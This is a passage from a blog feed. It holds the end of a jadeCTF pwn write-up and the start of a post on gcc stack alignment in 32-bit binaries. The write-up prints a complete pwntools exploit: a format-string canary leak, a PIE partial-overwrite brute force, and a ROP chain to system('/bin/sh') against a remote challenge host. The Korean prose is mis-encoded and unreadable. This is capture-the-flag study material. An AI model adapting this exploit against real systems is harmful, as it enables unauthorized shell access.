class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">off = <span class="number">30</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        off = <span class="number">77</span></span><br><span class="line">        find_canary = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(off)+<span class="string">&#x27;$p&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;]?\n&#x27;</span>, find_canary)</span><br><span class="line">        <span class="comment">#off = off+1</span></span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        leak = p.recvline()</span><br><span class="line">        canary = <span class="built_in">int</span>(leak[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#print(off, hex(canary))</span></span><br><span class="line">        </span><br><span class="line">        log.info(<span class="built_in">hex</span>(canary))</span><br><span class="line">        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;correct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">        payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">        payload += <span class="string">b&#x27;\x78\x15&#x27;</span></span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;]?\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">off = 30</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        off = 85 </span></span><br><span class="line"><span class="string">        find_pie = &#x27;%&#x27;+str(off)+&#x27;$p&#x27;</span></span><br><span class="line"><span class="string">        p.sendline(find_pie)</span></span><br><span class="line"><span class="string">        #off = off+1</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        p.recvuntil(&#x27;: &#x27;)</span></span><br><span class="line"><span class="string">        leak = p.recvline()</span></span><br><span class="line"><span class="string">        pie = int(leak[2:],16)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        print(off, hex(pie))</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        p.sendlineafter(&#x27;correct?\n&#x27;, b&#x27;yes&#x27;)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        payload = b&#x27;&#x27;</span></span><br><span class="line"><span class="string">        payload += b&#x27;A&#x27; * (0x210-0x8)</span></span><br><span class="line"><span class="string">        payload += p64(canary)</span></span><br><span class="line"><span class="string">        payload += b&#x27;B&#x27; * 0x8</span></span><br><span class="line"><span class="string">        payload += b&#x27;\x78\x15&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        p.sendlineafter(&#x27;:\n&#x27;, payload)</span></span><br><span class="line"><span class="string">        p.recvuntil(&#x27;]?\n&#x27;)</span></span><br><span class="line"><span class="string">        continue</span></span><br><span class="line"><span class="string">    except Exception as e:</span></span><br><span class="line"><span class="string">        print(e)</span></span><br><span class="line"><span class="string">        p.close()</span></span><br><span class="line"><span class="string">        #p = process(&#x27;./chall&#x27;)</span></span><br><span class="line"><span class="string">        p = remote(&#x27;34.76.206.46&#x27;, 10003)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="comment">#exit(0)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;%85$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">pie = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x1577</span></span><br><span class="line">info(<span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = pie+<span class="number">0x1663</span></span><br><span class="line">ret = pie+<span class="number">0x909</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line"><span class="comment">#payload += p64(ret)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(pie + elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pie + elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pie + elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line"><span class="comment">#leak = int(p.recv(14)[:-1].decode(), 16)</span></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;puts leak :: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#puts 6a0</span></span><br><span class="line"><span class="comment">#gets d90</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc_base = leak - libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">info(&#x27;libc base :: &#x27;+ hex(libc_base))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">system = libc_base + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh = libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">system = leak - <span class="number">0x2a300</span></span><br><span class="line">binsh = leak + <span class="number">0x11d7b7</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;asdf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadeCTF&#123;sh3llc0ding_but_w1th_4_tw1st&#125;</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>Î°∏ÏóÖ Ï†ÅÏúºÎãàÍπå Ïù¥ Î¨∏Ï†úÎäî Îß§Ïö∞ Í∞ÑÎã®Ìïú Î¨∏Ï†úÏûÑÏùÑ Íπ®Îã¨ÏïòÎã§. Î∂ÄÎÅÑÎüΩÏßÄÎßå pieÍ∞Ä Í±∏Î†§ÏûàÎäîÎç∞ Ïñ¥ÎñªÍ≤å ROPÎ•º Ìï¥ÏïºÌï†ÏßÄ Í≥†ÎØºÏùÑ ÌñàÎã§. ÏùºÎã® localÏóêÏÑú ÏßÑÌñâÌï† ÎïåÎèÑ ÎßàÏßÄÎßâ 2 Î∞îÏù¥Ìä∏Îßå ÎçÆÏùÑ ÏÉùÍ∞ÅÏùÑ Î™ªÌñàÏóàÍ≥†, local ÌõÑÏóê remoteÏùò libcÍ∞Ä Îã§Î•∏Îç∞ pieÍ∞Ä Í±∏Î†§ÏûàÎäîÎç∞ Í∑∏Í±∏ Ïñ¥ÎñªÍ≤å ÏïåÏïÑÎÇ¥Ïïº ÌïòÎäîÏßÄ.. Îì±Îì± Í≥†ÎØºÏùÑ ÍΩ§ÎÇò ÌñàÎã§. (offsetÏùÑ Î∏åÌè¨ÌïòÎ©¥ ÎêúÎã§.)</p><p>Ïù¥ Î¨∏Ï†ú ÎçïÏóê Ï£ºÏÜå ÏùºÎ∂ÄÎßå ÎçÆÏùÑ Ïàò ÏûàÎã§Îäî ÏÉùÍ∞ÅÍ≥º Î£®ÌîÑ, try-except Îì±ÏùÑ Ïù¥Ïö©ÌïòÏó¨ offsetÏùÑ Íµ¨ÌïòÎäî Í≥ºÏ†ïÏùÑ Î∞∞Ïö∏ Ïàò ÏûàÏóàÎã§.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Jade </category>
          
      </categories>
      
      
        <tags>
            
            <tag> canary </tag>
            
            <tag> fsb </tag>
            
            <tag> pie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stack Alignment in 32-bit program</title>
      <link href="/221020-32bit_stack_aligned/"/>
      <url>/221020-32bit_stack_aligned/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>Î∂ÄÏ†ú: gcc ÏòµÏÖò Ï§ë ÌïòÎÇòÏù∏ <code>-mpreferred-stack-boundary</code>Ïóê ÎåÄÌïòÏó¨</p><p>Pwnable Î¨∏Ï†úÎ•º ÌíÄÎã§Í∞Ä Î¨∏Îìù 32bit ROPÎ•º ÏÇ¥Ïßù ÏûäÏóàÎã§Îäî Í∏∞Î∂ÑÏù¥ Îì§ÏóàÎã§. (‚Ä¶) ÏòàÏ†ú ÏΩîÎìúÎ•º ÏûëÏÑ±ÌïòÍ≥† Í∑∏Í≤ÉÏùÑ ÏùµÏä§ÌïòÎ†§Í≥† ÌñàÏúºÎÇò ÏÉùÍ∞ÅÎåÄÎ°ú Ïûò ÎêòÏßÄ ÏïäÏïÑ Î∂ÑÏÑùÏùÑ ÏßÑÌñâÌïòÏòÄÎã§. Ìï®Ïàò ÌîÑÎ°§Î°úÍ∑∏ÏôÄ ÏóêÌïÑÎ°úÍ∑∏Ïóê ÎÇØÏÑ† ÏΩîÎìúÍ∞Ä Ï∂îÍ∞ÄÎêòÏñ¥ ÏûàÏóàÍ≥†, Ïù¥ ÎïåÎ¨∏Ïóê bufÏôÄ sfp ÏÇ¨Ïù¥Ïóê Î¨¥Ïñ∏Ïùò Í∞íÏù¥ Îì§Ïñ¥ÏûàÏóàÎã§. Î∂ÑÏÑù Í≤∞Í≥º, ÏõêÏù∏ÏùÄ gcc ÏòµÏÖò Ï§ë ÌïòÎÇòÏù∏ <code>-mpreferred-stack-boundary</code> ÎïåÎ¨∏ÏûÑÏùÑ ÏïåÍ≤åÎêòÏóàÎã§. </p><p>PwnableÏóêÏÑúÏùò 32bit Î∞îÏù¥ÎÑàÎ¶¨Îäî (Í±∞Ïùò) ÎåÄÎ∂ÄÎ∂Ñ <code>-mpreferred-stack-boundary=2</code> ÏòµÏÖòÏùÑ Ï£ºÍ≥† Ïª¥ÌååÏùºÏùÑ ÌïúÎã§.</p><h2 id="gcc-option-mpreferred-stack-boundary-N"><a href="#gcc-option-mpreferred-stack-boundary-N" class="headerlink" title="gcc option: -mpreferred-stack-boundary=N"></a>gcc option: <code>-mpreferred-stack-boundary=N</code></h2><p>Attempt to keep the stack boundary aligned to a 2 raised to num byte boundary.<br>If ‚Äò-mpreferred-stack-boundary‚Äô is not specified, the default is 4 (16 bytes or<br>128 bits).</p><ul><li>Ï∂úÏ≤ò: <a href="https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc.pdf">https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc.pdf</a></li></ul><p>mainÏùÑ Ìè¨Ìï®ÌïòÏó¨ Ïù¥ÌõÑÏóê Î∂àÎ¶¨Îäî Î™®Îì† Ìï®ÏàòÎì§Ïùò Ïä§ÌÉùÌîÑÎ†àÏûÑÏóêÏÑú Í∞ÄÏû• ÎÇÆÏùÄ Ï£ºÏÜåÍ∞Ä 2^N Ïóê Î∞∞ÏàòÍ∞Ä ÎêòÎèÑÎ°ù alignÏùÑ Ìï¥Ï§ÄÎã§.</p><p>Ïª¥ÌååÏùºÌï† Îïå Ï†Ä ÏòµÏÖòÏùÑ Ï£ºÏßÄ ÏïäÏúºÎ©¥ <code>-mpreferred-stack-boundary=4</code>Í∞Ä ÎîîÌè¥Ìä∏Î°ú Îì§Ïñ¥Í∞ÄÍ≤å ÎêúÎã§. Í∑∏ÎûòÏÑú Ïä§ÌÉù alignÏù¥ 16Î∞îÏù¥Ìä∏Î°ú ÎßûÏ∂∞ÏßÄÍ≤å ÎêúÎã§. </p><p>Í¥ÄÎ†® ÏΩîÎìúÎäî ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* Validate -mpreferred-stack-boundary= value or default it to</span></span><br><span class="line"><span class="comment">    PREFERRED_STACK_BOUNDARY_DEFAULT.  */</span></span><br><span class="line"> ix86_preferred_stack_boundary = PREFERRED_STACK_BOUNDARY_DEFAULT;</span><br><span class="line"> <span class="keyword">if</span> (opts_set-&gt;x_ix86_preferred_stack_boundary_arg)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">int</span> min = TARGET_64BIT_P (opts-&gt;x_ix86_isa_flags)? <span class="number">3</span> : <span class="number">2</span>;</span><br><span class="line">     <span class="type">int</span> max = TARGET_SEH ? <span class="number">4</span> : <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (opts-&gt;x_ix86_preferred_stack_boundary_arg &lt; min</span><br><span class="line">  || opts-&gt;x_ix86_preferred_stack_boundary_arg &gt; max)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (min == max)</span><br><span class="line">    error (<span class="string">&quot;%&lt;-mpreferred-stack-boundary%&gt; is not supported &quot;</span></span><br><span class="line">   <span class="string">&quot;for this target&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    error (<span class="string">&quot;%&lt;-mpreferred-stack-boundary=%d%&gt; is not between %d and %d&quot;</span>,</span><br><span class="line">   opts-&gt;x_ix86_preferred_stack_boundary_arg, min, max);</span><br><span class="line">&#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">ix86_preferred_stack_boundary</span><br><span class="line">  = (<span class="number">1</span> &lt;&lt; opts-&gt;x_ix86_preferred_stack_boundary_arg) * BITS_PER_UNIT;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li><a href="https://github.com/gcc-mirror/gcc/blob/releases/gcc-12/gcc/config/i386/i386-options.cc#L2463">https://github.com/gcc-mirror/gcc/blob/releases/gcc-12/gcc/config/i386/i386-options.cc#L2463</a></li></ul><h1 id="Default-Stack-aligned-to-a-16-byte-boundary"><a href="#Default-Stack-aligned-to-a-16-byte-boundary" class="headerlink" title="(Default) Stack aligned to a 16-byte boundary."></a>(Default) Stack aligned to a 16-byte boundary.</h1><h3 id="disassemble-main"><a href="#disassemble-main" class="headerlink" title="disassemble main"></a>disassemble main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x080491f1</span> &lt;+<span class="number">0</span>&gt;:lea    ecx,[esp+<span class="number">0x4</span>]</span><br><span class="line"><span class="number">0x080491f5</span> &lt;+<span class="number">4</span>&gt;:and    esp,<span class="number">0xfffffff0</span></span><br><span class="line"><span class="number">0x080491f8</span> &lt;+<span class="number">7</span>&gt;:  push   DWORD PTR [ecx<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line"><span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line"><span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx</span><br><span class="line"><span class="number">0x080491ff</span> &lt;+<span class="number">14</span>&gt;:sub    esp,<span class="number">0x44</span></span><br><span class="line"><span class="number">0x08049202</span> &lt;+<span class="number">17</span>&gt;:sub    esp,<span class="number">0x4</span></span><br><span class="line"><span class="number">0x08049205</span> &lt;+<span class="number">20</span>&gt;:push   <span class="number">0x40</span></span><br><span class="line"><span class="number">0x08049207</span> &lt;+<span class="number">22</span>&gt;:push   <span class="number">0x0</span></span><br><span class="line"><span class="number">0x08049209</span> &lt;+<span class="number">24</span>&gt;:lea    eax,[ebp<span class="number">-0x48</span>]</span><br><span class="line"><span class="number">0x0804920c</span> &lt;+<span class="number">27</span>&gt;:push   eax</span><br><span class="line"><span class="number">0x0804920d</span> &lt;+<span class="number">28</span>&gt;:call   <span class="number">0x8049080</span> &lt;<span class="built_in">memset</span>@plt&gt;</span><br><span class="line">...</span><br><span class="line"><span class="number">0x08049255</span> &lt;+<span class="number">100</span>&gt;:mov    ecx,DWORD PTR [ebp<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x08049258</span> &lt;+<span class="number">103</span>&gt;:leave  </span><br><span class="line"><span class="number">0x08049259</span> &lt;+<span class="number">104</span>&gt;:lea    esp,[ecx<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x0804925c</span> &lt;+<span class="number">107</span>&gt;:ret  </span><br></pre></td></tr></table></figure><h3 id="1-ÌîÑÎ°§Î°úÍ∑∏-Ï†Ñ-1"><a href="#1-ÌîÑÎ°§Î°úÍ∑∏-Ï†Ñ-1" class="headerlink" title="1. ÌîÑÎ°§Î°úÍ∑∏ Ï†Ñ (1)"></a>1. ÌîÑÎ°§Î°úÍ∑∏ Ï†Ñ (1)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">‚Üí  <span class="number">0x080491f1</span> &lt;+<span class="number">0</span>&gt; :lea    ecx,[esp+<span class="number">0x4</span>]</span><br><span class="line">   <span class="number">0x080491f5</span> &lt;+<span class="number">4</span>&gt; :and    esp,<span class="number">0xfffffff0</span></span><br><span class="line">   <span class="number">0x080491f8</span> &lt;+<span class="number">7</span>&gt; :push   DWORD PTR [ecx<span class="number">-0x4</span>]</span><br><span class="line">   <span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line">   <span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line">   <span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br></pre></td></tr></table></figure><p>Ïã§ÌñâÌïòÍ≥† ÎÇú ÌõÑ.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ecx  : 0xffffd960</span><br><span class="line">$esp  : 0xffffd95c</span><br></pre></td></tr></table></figure><p>ecx Î†àÏßÄÏä§ÌÑ∞Î•º ÏÇ¨Ïö©ÌïòÎ†§Í≥† ÌïòÎäîÍ±∏Íπå?</p><h3 id="2-ÌîÑÎ°§Î°úÍ∑∏-Ï†Ñ-2"><a href="#2-ÌîÑÎ°§Î°úÍ∑∏-Ï†Ñ-2" class="headerlink" title="2. ÌîÑÎ°§Î°úÍ∑∏ Ï†Ñ (2)"></a>2. ÌîÑÎ°§Î°úÍ∑∏ Ï†Ñ (2)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x080491f1</span> &lt;+<span class="number">0</span>&gt; :lea    ecx,[esp+<span class="number">0x4</span>]</span><br><span class="line">‚Üí  <span class="number">0x080491f5</span> &lt;+<span class="number">4</span>&gt; :and    esp,<span class="number">0xfffffff0</span></span><br><span class="line">   <span class="number">0x080491f8</span> &lt;+<span class="number">7</span>&gt; :push   DWORD PTR [ecx<span class="number">-0x4</span>]</span><br><span class="line">   <span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line">   <span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line">   <span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br></pre></td></tr></table></figure><p>Ïã§ÌñâÌïòÍ≥† ÎÇú ÌõÑ.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ecx  : 0xffffd960</span><br><span class="line">$esp  : 0xffffd950</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0xffffd950‚îÇ+0x0000: 0x00000000‚Üê $esp</span><br><span class="line">0xffffd954‚îÇ+0x0004: 0x00000000</span><br><span class="line">0xffffd958‚îÇ+0x0008: 0x8048354  ‚Üí  &quot;__libc_start_main&quot;</span><br><span class="line">0xffffd95c‚îÇ+0x000c: 0xf7c1f119  ‚Üí   add esp, 0x10</span><br><span class="line">0xffffd960‚îÇ+0x0010: 0x00000001</span><br><span class="line">0xffffd964‚îÇ+0x0014: 0xffffda14  ‚Üí  0xffffdb90  ‚Üí  &quot;/home/jir4vvit/study/rop32/chall&quot;</span><br><span class="line">0xffffd968‚îÇ+0x0018: 0xffffda1c  ‚Üí  0xffffdbb1  ‚Üí  &quot;SHELL=/bin/bash&quot;</span><br><span class="line">0xffffd96c‚îÇ+0x001c: 0xffffd980  ‚Üí  0xf7e1fe34  ‚Üí  0x0021fd4c</span><br><span class="line">0xffffd970‚îÇ+0x0020: 0xf7e1fe34  ‚Üí  0x0021fd4c</span><br><span class="line">0xffffd974‚îÇ+0x0024: 0x80491f1  ‚Üí  &lt;main+0&gt; lea ecx, [esp+0x4]</span><br></pre></td></tr></table></figure><p>32bit ÌîÑÎ°úÍ∑∏Îû®ÏóêÏÑ† block Îã®ÏúÑÍ∞Ä 4Î∞îÏù¥Ìä∏Ïù¥Í∏∞ ÎïåÎ¨∏Ïóê Ïª¥ÌååÏùºÎü¨(gcc)Í∞Ä and Ïó∞ÏÇ∞ÏúºÎ°ú espÎ•º 16Ïóê alignÏãúÌÇ§Îäî Î™®ÏäµÏùÑ ÌôïÏù∏Ìï† Ïàò ÏûàÎã§.</p><h4 id="ecx-Î†àÏßÄÏä§ÌÑ∞Î•º-Ïôú-push-ÌñàÏùÑÍπå"><a href="#ecx-Î†àÏßÄÏä§ÌÑ∞Î•º-Ïôú-push-ÌñàÏùÑÍπå" class="headerlink" title="ecx Î†àÏßÄÏä§ÌÑ∞Î•º Ïôú push ÌñàÏùÑÍπå?"></a><em>ecx Î†àÏßÄÏä§ÌÑ∞Î•º Ïôú push ÌñàÏùÑÍπå?</em></h4><p>ecx is a temporary register so it has to be saved. Also, depending on optimization level, some of the frame linkage ops that don‚Äôt seem strictly necessary to run the program might well be important in order to set up a trace-ready chain of frames.</p><ul><li>Ï∂úÏ≤ò: <a href="https://askcodes.net/coding/trying-to-understand-gcc-s-complicated-stack-alignment-at-the-top-of-main-that-copies-the-return-address">https://askcodes.net/coding/trying-to-understand-gcc-s-complicated-stack-alignment-at-the-top-of-main-that-copies-the-return-address</a></li></ul><h3 id="3-ÌîÑÎ°§Î°úÍ∑∏"><a href="#3-ÌîÑÎ°§Î°úÍ∑∏" class="headerlink" title="3. ÌîÑÎ°§Î°úÍ∑∏"></a>3. ÌîÑÎ°§Î°úÍ∑∏</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line"><span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line"><span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br></pre></td></tr></table></figure><p>ebpÎ•º pushÌïòÍ≥† mov Î™ÖÎ†πÏúºÎ°ú ebpÎ•º espÏôÄ Í∞ôÍ≤å ÏòÆÍ≤®Ï£ºÏóàÎã§.</p><p>ÏóêÌïÑÎ°úÍ∑∏Î•º ÏßÑÌñâÌï¥ÏÑú ebpÏôÄ espÎ•º Ïï†Ïç® ÎßûÏ∂∞Ï£ºÏóàÏùåÏóêÎèÑ Î∂àÍµ¨ÌïòÍ≥†(?) ecxÎ•º pushÌñàÎã§. 32bit ÌîÑÎ°úÍ∑∏Îû®Ïù¥ÎùºÎ©¥ Î¨¥Ï°∞Í±¥ buf, ebp(sfp) ÏàúÏùº Ï§Ñ ÏïåÏïòÎäîÎç∞ Ï§ëÍ∞ÑÏóê ecxÍ∞Ä ÎÅºÏñ¥ÏûàÎã§. Ïù¥Í≤ÉÏùÑ Î≥¥ÏßÄ Î™ªÌïòÍ≥† Î¨¥ÏûëÏ†ï ÏùµÏä§Î•º ÏßÑÌñâÌïòÎ†§Í≥† ÌïòÎã§Í∞Ä ÌèâÏÜåÏôÄ Ïä§ÌÉùÏù¥ ÏåìÏù¥Îäî Í≤ÉÏù¥ Ïù¥ÏÉÅÌï®ÏùÑ Í∞êÏßÄÌïòÍ≥† Î∂ÑÏÑùÏùÑ ÏßÑÌñâÌïòÍ≤å 